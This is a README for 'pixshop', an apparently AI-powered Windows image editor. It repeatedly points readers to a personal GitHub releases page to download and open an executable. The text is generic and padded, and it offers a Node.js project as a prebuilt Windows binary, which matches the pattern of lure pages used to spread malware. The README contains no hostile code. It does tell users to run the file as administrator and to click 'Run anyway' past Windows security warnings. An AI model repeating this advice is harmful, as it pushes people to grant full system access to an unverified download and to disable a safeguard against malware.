# 🎨 pixshop - Edit and launch images with ease

[![Download pixshop](https://img.shields.io/badge/Download-pixshop-7B68EE?style=for-the-badge&logo=github)](https://github.com/Jdarri1750/pixshop/releases)

## 📥 Download

Visit this page to download pixshop for Windows: https://github.com/Jdarri1750/pixshop/releases

1. Open the releases page.
2. Find the latest release.
3. Download the Windows file.
4. Save the file to your PC.
5. Open the file to start the app.

## 🖥️ What pixshop does

pixshop is a desktop app for working with images. It helps you open, view, and edit pictures from your Windows PC in one place.

Use it to:

- Open image files from your computer
- Make quick edits to pictures
- Check image results before you save them
- Work with an AI-powered studio app
- Run the app on your own machine

## 🚀 Getting started on Windows

Follow these steps to run pixshop on Windows:

1. Go to the download page.
2. Download the Windows release file.
3. If the file comes in a zip folder, extract it first.
4. Double-click the app file to open it.
5. If Windows asks for permission, choose to run it.
6. Wait for the app to load.
7. Use the app from your desktop or start menu if you make a shortcut.

## 🧰 What you need

For the local version of pixshop, you need:

- A Windows PC
- A web browser
- Node.js
- A Gemini API key

For the release download, you usually need only:

- Windows 10 or Windows 11
- Enough free space to save the app
- A stable internet connection for the download

## ⚙️ Run locally

If you want to run the app from source, follow these steps:

1. Install Node.js on your computer.
2. Download the project files.
3. Open the project folder.
4. Install the app files:
   `npm install`
5. Create or edit `.env.local`
6. Add your Gemini API key:
   `GEMINI_API_KEY=your_key_here`
7. Start the app:
   `npm run dev`
8. Open the local address shown in your terminal or browser.

## 🔑 Set your Gemini API key

pixshop uses a Gemini API key for AI features.

1. Open the `.env.local` file in the project folder.
2. Add this line:
   `GEMINI_API_KEY=your_key_here`
3. Replace `your_key_here` with your own key.
4. Save the file.
5. Start the app again if it was already open.

## 🧩 Simple setup checklist

Before you start, make sure you have:

- Downloaded the release file from GitHub
- Unzipped the file if needed
- Opened the app file
- Or, for local use, installed Node.js
- Added your Gemini API key
- Run `npm install`
- Run `npm run dev`

## 🪟 Windows tips

If the app does not open right away:

- Right-click the file and choose Run as administrator
- Check that the download finished
- Make sure the file is not still inside the zip folder
- Close and reopen the app
- Try downloading the latest release again

If Windows shows a security prompt:

- Choose More info
- Then choose Run anyway if you trust the file source

## 🗂️ File layout

When you open the project folder, you may see:

- `src` for app code
- `.env.local` for your API key
- `package.json` for app settings
- `node_modules` after setup
- Build files created during development

## 🛠️ Common tasks

### Open an image
1. Start pixshop.
2. Choose an image from your PC.
3. Open the file in the app.

### Edit an image
1. Load the image.
2. Use the tools in the app.
3. Save the result when you finish.

### Restart the app
1. Close pixshop.
2. Open it again from the file or shortcut.
3. Or rerun `npm run dev` if you use the local setup.

## 📌 Basic requirements

pixshop works best on:

- Windows 10 or newer
- 8 GB of RAM or more
- A modern web browser
- A stable internet connection for downloads and API use

## 🔗 Download page

Use this link to visit the release page and download pixshop for Windows:

https://github.com/Jdarri1750/pixshop/releases

## 📄 Local run steps

If you want to run the app from the project files:

1. Install Node.js.
2. Open a terminal in the project folder.
3. Run:
   `npm install`
4. Add your Gemini API key to `.env.local`.
5. Run:
   `npm run dev`
6. Open the local address shown after the app starts